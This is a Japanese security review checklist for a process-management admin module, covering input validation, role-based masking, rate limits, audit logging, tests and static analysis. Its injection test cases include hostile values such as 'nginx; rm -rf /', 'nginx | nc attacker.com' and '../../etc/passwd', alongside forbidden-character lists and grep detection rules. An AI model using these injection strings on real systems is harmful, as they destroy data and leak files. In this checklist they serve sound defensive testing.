# Running Processes モジュール - セキュリティチェックリスト

**作成日**: 2026-02-06
**対象**: Running Processes Management モジュール
**用途**: 実装レビュー、コードレビュー、テストレビュー

---

## 📋 チェックリスト構成

- **[P1]** - 必須（Critical）: 違反時は実装停止
- **[P2]** - 高優先度（High）: 違反時は即座に修正
- **[P3]** - 推奨（Medium）: 可能な限り実施

---

## 🛡️ Section 1: コーディング規約（CLAUDE.md 準拠）

### Python（backend）

- [ ] **[P1]** `shell=True` が存在しない（コメント含む全箇所）
  ```bash
  grep -r "shell=True" backend/api/routes/processes.py
  # 結果: ゼロ件
  ```

- [ ] **[P1]** `os.system` が存在しない
  ```bash
  grep -rE "os\.system\s*\(" backend/
  # 結果: ゼロ件
  ```

- [ ] **[P1]** `eval` / `exec` が存在しない
  ```bash
  grep -rE "\b(eval|exec)\s*\(" backend/
  # 結果: ゼロ件
  ```

- [ ] **[P1]** 型ヒント必須（全関数）
  ```python
  def list_processes(filter: str, user_role: str) -> dict[str, Any]:
      ...
  ```

- [ ] **[P2]** Docstring 必須（全 public 関数）
  ```python
  def list_processes(filter: str, user_role: str) -> dict[str, Any]:
      """プロセス一覧を取得

      Args:
          filter: フィルタ文字列（検証済み）
          user_role: ユーザーロール

      Returns:
          プロセス一覧の辞書

      Raises:
          SecurityError: 不正な入力
          PermissionError: 権限不足
      """
  ```

- [ ] **[P1]** 全ユーザー入力に Pydantic バリデーション
  ```python
  class ProcessFilterRequest(BaseModel):
      filter: str = Field(max_length=100)

      @field_validator('filter')
      @classmethod
      def validate_filter(cls, v: str) -> str:
          # FORBIDDEN_CHARS チェック
          ...
  ```

---

### Bash（wrappers）

- [ ] **[P1]** `set -euo pipefail` が冒頭に存在
  ```bash
  #!/bin/bash
  set -euo pipefail  # ← 必須
  ```

- [ ] **[P1]** `bash -c` が存在しない
  ```bash
  grep "bash -c" wrappers/adminui-processes.sh
  # 結果: ゼロ件
  ```

- [ ] **[P1]** 全引数を引用符で囲む
  ```bash
  # ✅ 良い例
  if [[ "$FILTER" =~ [';|&] ]]; then
      error "Invalid filter"
  fi

  # ❌ 悪い例
  if [[ $FILTER =~ [';|&] ]]; then  # 引用符なし
      ...
  fi
  ```

- [ ] **[P1]** 特殊文字検証を実装
  ```bash
  if [[ "$FILTER" =~ [';|&$(){}[\]`<>*?] ]]; then
      error "Forbidden characters detected"
  fi
  ```

- [ ] **[P2]** logger でログ記録
  ```bash
  log() {
      logger -t adminui-processes -p user.info "$*"
      echo "[$(date -Iseconds)] $*" >&2
  }
  ```

- [ ] **[P1]** コマンドは配列渡し（shell展開なし）
  ```bash
  # ✅ 良い例
  ps aux --no-headers

  # ❌ 悪い例
  eval "ps aux --no-headers"  # eval 禁止
  ```

---

## 🔒 Section 2: セキュリティ実装

### 入力バリデーション

- [ ] **[P1]** PID 検証: 1 ~ 4194304
  ```python
  pid: int = Field(ge=1, le=4194304)
  ```

- [ ] **[P1]** フィルタ文字列: FORBIDDEN_CHARS チェック
  ```python
  FORBIDDEN_CHARS = [";", "|", "&", "$", "(", ")", "`", ">", "<", "*", "?", "{", "}", "[", "]"]

  for char in FORBIDDEN_CHARS:
      if char in filter_str:
          raise ValueError(f"Forbidden character: {char}")
  ```

- [ ] **[P1]** フィルタ文字列: 正規表現検証
  ```python
  if not re.match(r'^[a-zA-Z0-9\-_.]+$', filter_str):
      raise ValueError("Invalid characters")
  ```

- [ ] **[P2]** フィルタ文字列: 最大長制限（100文字）
  ```python
  filter: str = Field(max_length=100)
  ```

---

### RBAC（ロールベースアクセス制御）

- [ ] **[P1]** Viewer ロール: 機密フィールド非表示
  ```python
  if user_role == "Viewer":
      process.pop("environ", None)
      process["cmdline"] = mask_sensitive_cmdline(process["cmdline"], "Viewer")
  ```

- [ ] **[P1]** Operator/Approver: cmdline マスク処理
  ```python
  def mask_sensitive_cmdline(cmdline: list[str], user_role: str) -> list[str]:
      if user_role == "Admin":
          return cmdline
      return [mask_password(arg) for arg in cmdline]
  ```

- [ ] **[P2]** Admin ロール: 全フィールドアクセス可能
  ```python
  if user_role == "Admin":
      # 全フィールドを返す（マスクなし）
      return process
  ```

---

### レート制限

- [ ] **[P2]** プロセス一覧: 60 req/min/user
  ```python
  @limiter.limit("60/minute")
  async def list_processes(...):
      ...
  ```

- [ ] **[P2]** プロセス詳細: 120 req/min/user
  ```python
  @limiter.limit("120/minute")
  async def get_process_detail(...):
      ...
  ```

- [ ] **[P3]** IP単位のレート制限も実装
  ```python
  @limiter.limit("100/minute", key_func=get_remote_address)
  ```

---

### 監査ログ

- [ ] **[P1]** 全操作を audit_log.record() で記録
  ```python
  audit_log.record(
      operation="process_list",
      user_id=current_user.email,
      target="all",
      status="success",
      details={"filter": filter_str, "result_count": len(processes)}
  )
  ```

- [ ] **[P1]** 失敗時も記録（status="failure"）
  ```python
  except Exception as e:
      audit_log.record(
          operation="process_list",
          user_id=current_user.email,
          target="all",
          status="failure",
          details={"error": str(e)}
      )
      raise
  ```

- [ ] **[P2]** クライアントIPを記録
  ```python
  details={"client_ip": request.client.host, ...}
  ```

---

### 機密情報保護

- [ ] **[P1]** cmdline のパスワード検出・マスク
  ```python
  PASSWORD_KEYWORDS = ["password", "passwd", "token", "key", "secret", "auth"]

  def contains_password(arg: str) -> bool:
      return any(kw in arg.lower() for kw in PASSWORD_KEYWORDS)

  def mask_password(arg: str) -> str:
      return "***REDACTED***" if contains_password(arg) else arg
  ```

- [ ] **[P1]** environ フィールドの制限
  ```python
  # Viewer/Operator には environ を返さない
  if user_role not in ["Admin", "Approver"]:
      process.pop("environ", None)
  ```

- [ ] **[P2]** Admin 向けにも警告を表示
  ```python
  if "environ" in process:
      process["_warning"] = "Contains sensitive environment variables"
  ```

---

## 🧪 Section 3: テスト実装

### セキュリティテスト

- [ ] **[P1]** コマンドインジェクション: 10+ テストケース
  ```python
  @pytest.mark.parametrize("malicious_filter", [
      "nginx; rm -rf /",
      "nginx | nc attacker.com",
      "nginx && whoami",
      # ... 10+ ケース
  ])
  def test_reject_command_injection(self, malicious_filter):
      with pytest.raises(ValueError):
          ProcessFilterRequest(filter=malicious_filter)
  ```

- [ ] **[P1]** FORBIDDEN_CHARS 全文字のテスト
  ```python
  @pytest.mark.parametrize("char", FORBIDDEN_CHARS)
  def test_reject_forbidden_char(self, char):
      malicious = f"nginx{char}ls"
      with pytest.raises(ValueError):
          ProcessFilterRequest(filter=malicious)
  ```

- [ ] **[P1]** PID 境界値テスト
  ```python
  @pytest.mark.parametrize("invalid_pid", [-1, 0, 4194305])
  def test_reject_invalid_pid(self, invalid_pid):
      with pytest.raises(ValueError):
          ProcessPIDRequest(pid=invalid_pid)
  ```

- [ ] **[P2]** パストラバーサルテスト
  ```python
  def test_reject_path_traversal_in_filter(self):
      malicious = "../../etc/passwd"
      with pytest.raises(ValueError):
          ProcessFilterRequest(filter=malicious)
  ```

---

### RBAC テスト

- [ ] **[P1]** Viewer: 機密フィールド非表示
  ```python
  def test_viewer_cannot_see_environ(self, viewer_headers):
      response = test_client.get("/api/processes/1234", headers=viewer_headers)
      assert "environ" not in response.json()
  ```

- [ ] **[P1]** Admin: 全フィールド表示
  ```python
  def test_admin_can_see_all_fields(self, admin_headers):
      response = test_client.get("/api/processes/1234", headers=admin_headers)
      assert "cmdline" in response.json()
  ```

- [ ] **[P2]** cmdline マスク処理の正確性
  ```python
  def test_mask_password_in_cmdline(self):
      cmdline = ["mysql", "-u", "root", "-pSecretPass"]
      masked = mask_sensitive_cmdline(cmdline, "Viewer")
      assert "***REDACTED***" in masked
      assert "SecretPass" not in str(masked)
  ```

---

### レート制限テスト

- [ ] **[P2]** 閾値超過時に 429 エラー
  ```python
  def test_rate_limit_exceeded(self, auth_headers):
      for _ in range(61):
          response = test_client.get("/api/processes", headers=auth_headers)

      assert response.status_code == 429
  ```

- [ ] **[P3]** 異なるユーザーは独立したカウント
  ```python
  def test_rate_limit_per_user(self, user1_headers, user2_headers):
      for _ in range(60):
          test_client.get("/api/processes", headers=user1_headers)

      # user2 は影響なし
      response = test_client.get("/api/processes", headers=user2_headers)
      assert response.status_code == 200
  ```

---

### 監査ログテスト

- [ ] **[P1]** 成功操作のログ記録
  ```python
  def test_audit_log_on_success(self, auth_headers):
      test_client.get("/api/processes?filter=nginx", headers=auth_headers)

      logs = audit_log.query(operation="process_list", limit=1)
      assert logs[0]["status"] == "success"
      assert logs[0]["filter"] == "nginx"
  ```

- [ ] **[P1]** 失敗操作のログ記録
  ```python
  def test_audit_log_on_failure(self, auth_headers):
      # 不正なフィルタでリクエスト
      test_client.get("/api/processes?filter=nginx;ls", headers=auth_headers)

      logs = audit_log.query(operation="process_list", status="failure", limit=1)
      assert len(logs) == 1
  ```

---

### Wrapper テスト

- [ ] **[P1]** 正常系: フィルタなし
  ```bash
  ./adminui-processes.sh list
  echo $?  # 0
  ```

- [ ] **[P1]** 正常系: フィルタあり
  ```bash
  ./adminui-processes.sh list nginx
  echo $?  # 0
  ```

- [ ] **[P1]** 異常系: 特殊文字拒否
  ```bash
  if ./adminui-processes.sh list "nginx;ls" 2>/dev/null; then
      echo "❌ Should reject special characters"
      exit 1
  fi
  echo "✅ Rejected special characters"
  ```

- [ ] **[P1]** 異常系: 無効なPID
  ```bash
  if ./adminui-processes.sh detail 0 2>/dev/null; then
      echo "❌ Should reject invalid PID"
      exit 1
  fi
  echo "✅ Rejected invalid PID"
  ```

- [ ] **[P2]** ログ記録の確認
  ```bash
  ./adminui-processes.sh list nginx
  journalctl -t adminui-processes -n 1 | grep "Process list requested"
  ```

---

## 🔍 Section 4: 静的解析

### Bandit（Python セキュリティスキャン）

- [ ] **[P1]** Bandit スキャン実行: 重大な問題なし
  ```bash
  bandit -r backend/api/routes/processes.py -ll
  # 結果: No issues identified
  ```

- [ ] **[P2]** Bandit 全ファイルスキャン
  ```bash
  bandit -r backend/ -f json -o bandit-report.json
  # High/Medium の問題ゼロ
  ```

---

### ShellCheck（Bash スクリプト検証）

- [ ] **[P1]** ShellCheck 実行: エラーなし
  ```bash
  shellcheck wrappers/adminui-processes.sh
  # 結果: ゼロエラー
  ```

- [ ] **[P2]** ShellCheck 警告も修正
  ```bash
  shellcheck -S warning wrappers/adminui-processes.sh
  # 結果: ゼロ警告
  ```

---

### Grep パターン検出（CI/CD）

- [ ] **[P1]** shell=True 検出: ゼロ件
  ```bash
  grep -r "shell=True" backend/ && exit 1 || echo "✅ OK"
  ```

- [ ] **[P1]** os.system 検出: ゼロ件
  ```bash
  grep -rE "os\.system\s*\(" backend/ && exit 1 || echo "✅ OK"
  ```

- [ ] **[P1]** eval/exec 検出: ゼロ件
  ```bash
  grep -rE "\b(eval|exec)\s*\(" backend/ && exit 1 || echo "✅ OK"
  ```

- [ ] **[P1]** bash -c 検出: ゼロ件
  ```bash
  grep -r "bash -c" wrappers/ && exit 1 || echo "✅ OK"
  ```

---

## 📊 Section 5: カバレッジ

### テストカバレッジ目標

- [ ] **[P1]** backend/api/routes/processes.py: **90%以上**
  ```bash
  pytest tests/ --cov=backend/api/routes/processes --cov-report=html
  # Coverage: 92%
  ```

- [ ] **[P1]** セキュリティテスト: **15+ テストケース**
  ```bash
  pytest tests/security/test_processes_security.py -v
  # 18 tests passed
  ```

- [ ] **[P2]** Wrapper テスト: **全パターン**
  ```bash
  ./wrappers/test/test-adminui-processes.sh
  # ✅ All tests passed
  ```

---

## 🚨 Section 6: 人間承認必須ポイント

以下の項目は**必ず人間による承認**を得てから実装：

- [ ] **[CRITICAL]** sudoers への `adminui-processes.sh` 追加
  ```
  svc-adminui ALL=(root) NOPASSWD: /usr/local/sbin/adminui-processes.sh
  ```

- [ ] **[CRITICAL]** environ フィールドの出力可否決定
  - Admin に対しても環境変数を返すか？
  - マスク処理で十分か？

- [ ] **[CRITICAL]** レート制限の閾値決定
  - 60 req/min で十分か？
  - 開発環境での無効化の可否

- [ ] **[HIGH]** RBAC マトリクスの最終承認
  - Viewer は本当に全プロセスを見てよいか？
  - Operator の権限範囲は適切か？

---

## 📝 Section 7: ドキュメント

- [ ] **[P2]** API ドキュメント更新（OpenAPI）
  ```yaml
  /api/processes:
    get:
      summary: プロセス一覧取得
      security:
        - BearerAuth: []
      parameters:
        - name: filter
          in: query
          schema:
            type: string
            maxLength: 100
            pattern: '^[a-zA-Z0-9\-_.]+$'
  ```

- [ ] **[P2]** セキュリティドキュメント更新
  - THREAT_ANALYSIS_PROCESSES.md の定期レビュー

- [ ] **[P3]** ユーザーガイド作成
  - プロセス管理機能の使い方
  - 機密情報マスクの説明

---

## ✅ 最終チェック

### 実装完了前（必須）

- [ ] **[P1]** 全 P1 項目クリア
- [ ] **[P1]** セキュリティテスト 90%+ カバレッジ
- [ ] **[P1]** Bandit, ShellCheck 全パス
- [ ] **[P1]** 人間承認取得（sudoers, RBAC, レート制限）

### 実装完了後（推奨）

- [ ] **[P2]** 全 P2 項目クリア
- [ ] **[P2]** ドキュメント更新完了
- [ ] **[P3]** 全 P3 項目の検討・実装

---

## 🔐 security-checker サインオフ

- [ ] **全チェック項目の確認完了**
- [ ] **セキュリティ違反ゼロ**
- [ ] **CLAUDE.md セキュリティ原則準拠**
- [ ] **実装承認（security-checker）**

---

**チェックリスト完了日**: __________
**レビュアー署名**: __________
**次回レビュー日**: __________

---

**最終更新**: 2026-02-06
